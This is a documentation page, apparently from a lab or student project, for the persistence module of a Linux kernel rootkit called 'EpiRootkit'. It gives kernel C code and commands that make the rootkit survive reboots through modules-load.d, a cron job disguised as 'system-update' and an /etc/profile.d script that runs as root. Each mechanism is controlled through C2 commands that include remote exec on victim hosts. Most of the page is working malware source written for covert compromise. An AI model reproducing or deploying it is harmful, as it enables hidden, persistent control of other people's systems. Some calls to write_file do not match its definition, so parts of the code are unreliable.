---
title: "Persistence"
description: "Multiple boot persistence mechanisms for rootkit survival"
icon: "refresh"
date: "2025-05-25T00:00:00+01:00"
lastmod: "2025-05-25T00:00:00+01:00"
draft: false
toc: true
weight: 513
---

# Persistence

Multiple boot persistence mechanisms to ensure rootkit survival across system reboots.

## What We Implemented

### Three Persistence Mechanisms
1. **modules-load.d**: Systemd automatic module loading
2. **Cron Jobs**: Scheduled module loading via cron
3. **Shell Profiles**: Load via user login scripts

### Automatic Installation
- **On module load**: All persistence mechanisms installed automatically
- **Dynamic control**: Install/remove via C2 commands
- **Individual control**: Manage each mechanism separately

## How It Works

### Automatic Installation
When the rootkit loads, it automatically installs all persistence mechanisms:

```c
int persistence_init(void)
{
    pr_info("EpiRootkit: Persistence module initialized\n");
    
    // Automatically install all persistence mechanisms
    return persistence_install();
}
```

### Manual Control
```bash
# Install all persistence mechanisms
c2-server$ persist_install Client-1
# SUCCESS: All persistence mechanisms installed

# Remove all persistence mechanisms  
c2-server$ persist_remove Client-1
# SUCCESS: All persistence mechanisms removed

# Individual mechanism control
c2-server$ persist_modules Client-1    # modules-load.d only
c2-server$ persist_cron Client-1       # cron only
c2-server$ persist_profile Client-1    # shell profile only
```

## Mechanism 1: modules-load.d

### How It Works
- **File**: `/etc/modules-load.d/epirootkit.conf`
- **Content**: `epirootkit`
- **Boot process**: systemd reads config and loads module automatically

### Implementation
```c
int persistence_install_modules_load(void)
{
    char config_path[256];
    int ret;

    snprintf(config_path, sizeof(config_path), "%s%s", 
             MODULES_LOAD_DIR, EPIROOTKIT_CONF);
    
    ret = write_file(config_path, MODULE_NAME "\n");
    if (ret < 0)
        return ret;

    pr_info("EpiRootkit: modules-load.d persistence installed\n");
    return 0;
}
```

### Verification
```bash
# Check if installed
c2-server$ exec Client-1 cat /etc/modules-load.d/epirootkit.conf
# Exit code: 0
# Output:
# epirootkit

# Remove manually
c2-server$ exec Client-1 rm /etc/modules-load.d/epirootkit.conf
```

## Mechanism 2: Cron Jobs

### How It Works
- **File**: `/etc/cron.d/system-update` (we are stealthy hehe)
- **Schedule**: Every 5 minutes check and load if not present
- **Command**: `*/5 * * * * root /bin/bash -c 'if ! lsmod | grep -q epirootkit; then modprobe epirootkit 2>/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2>/dev/null; fi' >/dev/null 2>&1`

### Implementation
```c
int persistence_install_cron(void)
{
    char cron_path[256];
    const char *cron_content = 
        "# System update check - runs every 5 minutes\n"
        PERSISTENCE_MARKER_START "\n"
        "*/5 * * * * root /bin/bash -c 'if ! lsmod | grep -q epirootkit; then modprobe epirootkit 2>/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2>/dev/null; fi' >/dev/null 2>&1\n"
        PERSISTENCE_MARKER_END "\n";

    int ret;

    snprintf(cron_path, sizeof(cron_path), "%s%s", CRON_DIR, CRON_FILE);
    
    ret = write_file(cron_path, cron_content, 0644);
    if (ret < 0)
        return ret;

    pr_info("EpiRootkit: Cron persistence installed\n");
    return 0;
}
```

### Verification
```bash
# Check cron job
c2-server$ exec Client-1 cat /etc/cron.d/system-update
# Exit code: 0
# Output:
# # System update check - runs every 5 minutes
# # EpiRootkit persistence - DO NOT REMOVE
# */5 * * * * root /bin/bash -c 'if ! lsmod | grep -q epirootkit; then modprobe epirootkit 2>/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2>/dev/null; fi' >/dev/null 2>&1
# # End EpiRootkit persistence

# Check cron logs
c2-server$ exec Client-1 grep epirootkit /var/log/syslog
```

## Mechanism 3: Shell Profiles

### How It Works
- **File**: `/etc/profile.d/system-env.sh`
- **Trigger**: Executes when any user logs in
- **Command**: Loads module if not already present

### Implementation
```c
int persistence_install_shell_profile(void)
{
    char profile_path[256];
    const char *profile_content = 
        "#!/bin/bash\n"
        PERSISTENCE_MARKER_START "\n"
        "# System environment initialization\n"
        "if [ \"$(id -u)\" -eq 0 ]; then\n"
        "    if ! lsmod | grep -q epirootkit 2>/dev/null; then\n"
        "        modprobe epirootkit 2>/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2>/dev/null\n"
        "    fi\n"
        "fi\n"
        PERSISTENCE_MARKER_END "\n";

    int ret;

    snprintf(profile_path, sizeof(profile_path), "%s%s", 
             PROFILE_DIR, PROFILE_FILE);
    
    ret = write_file(profile_path, profile_content, 0755);
    if (ret < 0)
        return ret;

    pr_info("EpiRootkit: Shell profile persistence installed\n");
    return 0;
}
```

### Verification
```bash
# Check profile script
c2-server$ exec Client-1 cat /etc/profile.d/system-env.sh
# Exit code: 0
# Output:
# #!/bin/bash
# # EpiRootkit persistence - DO NOT REMOVE
# # System environment initialization
# if [ "$(id -u)" -eq 0 ]; then
#     if ! lsmod | grep -q epirootkit 2>/dev/null; then
#         modprobe epirootkit 2>/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2>/dev/null
#     fi
# fi
# # End EpiRootkit persistence
```

## Technical Implementation

### File Operations
```c
static int write_file(const char *path, const char *content)
{
    struct file *file;
    loff_t pos = 0;
    ssize_t bytes_written;
    size_t content_len = strlen(content);

    file = filp_open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (IS_ERR(file))
        return PTR_ERR(file);

    bytes_written = kernel_write(file, content, content_len, &pos);
    filp_close(file, NULL);

    return (bytes_written == content_len) ? 0 : -EIO;
}
```

### File Removal
```c
static int remove_file(const char *path)
{
    struct path file_path;
    struct dentry *dentry;
    struct inode *dir_inode;
    int ret;

    ret = kern_path(path, LOOKUP_FOLLOW, &file_path);
    if (ret)
        return 0; // File doesn't exist - not an error

    dentry = file_path.dentry;
    dir_inode = d_inode(dentry->d_parent);
    
    inode_lock(dir_inode);
    ret = vfs_unlink(dir_inode, dentry, NULL);
    inode_unlock(dir_inode);
    
    path_put(&file_path);
    return ret;
}
```

### Manual Testing
```bash
# Test modules-load.d
c2-server$ exec Client-1 systemd-modules-load /etc/modules-load.d/epirootkit.conf

# Test cron job manually
c2-server$ exec Client-1 /sbin/modprobe epirootkit

# Test profile script
c2-server$ exec Client-1 bash /etc/profile.d/system-env.sh
```
